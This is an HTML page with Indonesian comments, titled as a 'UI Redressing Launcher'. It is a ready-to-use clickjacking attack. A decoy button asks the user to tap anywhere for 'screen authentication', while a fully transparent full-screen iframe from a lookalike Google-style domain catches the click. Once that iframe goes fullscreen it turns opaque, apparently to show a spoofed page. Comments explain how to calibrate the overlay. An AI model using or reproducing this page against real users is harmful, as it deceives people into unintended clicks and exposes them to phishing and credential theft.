<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UI Redressing Launcher - Click Anywhere</title>
    <style>
        /* 1. Paksa body mengisi seluruh layar tanpa scrollbar */
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }

        /* 2. PERUBAHAN UTAMA: Kontainer jebakan memenuhi seluruh layar */
        .container {
            position: relative;
            width: 100vw;
            height: 100vh;
            background: #f0f0f0;
        }

        /* Umpan visual agar pengguna merasa perlu mengklik halaman */
        .decoy-background {
            position: absolute;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1;
            background-color: #f8f9fa;
        }

        .decoy-text {
            padding: 20px 40px;
            background: #1a73e8;
            color: white;
            font-size: 18px;
            font-weight: bold;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            text-align: center;
        }
        
        /* 3. Iframe transparan yang menutupi seluruh layar sejak awal */
        .overlay-frame {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw !important;
            height: 100vh !important;
            border: none;
            z-index: 2;
            opacity: 0.0; /* Ubah ke 0.3 untuk kalibrasi/melihat area cakupan hijau iframe */
        }

        /* Ketika iframe masuk ke Top Layer via requestFullscreen */
        .overlay-frame:fullscreen {
            width: 100vw !important;
            height: 100vh !important;
            opacity: 1.0 !important; /* Buat isi server langsung terlihat penuh */
            background-color: #ffffff !important;
        }
        
        /* Dukungan WebKit engine (Safari / iOS WebView) */
        .overlay-frame:-webkit-full-screen {
            width: 100vw !important;
            height: 100vh !important;
            opacity: 1.0 !important;
            background-color: #ffffff !important;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="decoy-background">
        <div class="decoy-text">
            Ketuk Di Mana Saja untuk Melanjutkan
            <div style="font-size: 12px; font-weight: normal; margin-top: 5px; color: #e8f0fe;">
                (Membutuhkan otentikasi layar)
            </div>
        </div>
    </div>
    
    <iframe 
        class="overlay-frame" 
        src="https://googllogoligaturee.my.id/full.html"
        allow="fullscreen https://googllogoligaturee.my.id">
    </iframe>
</div>

</body>
</html>
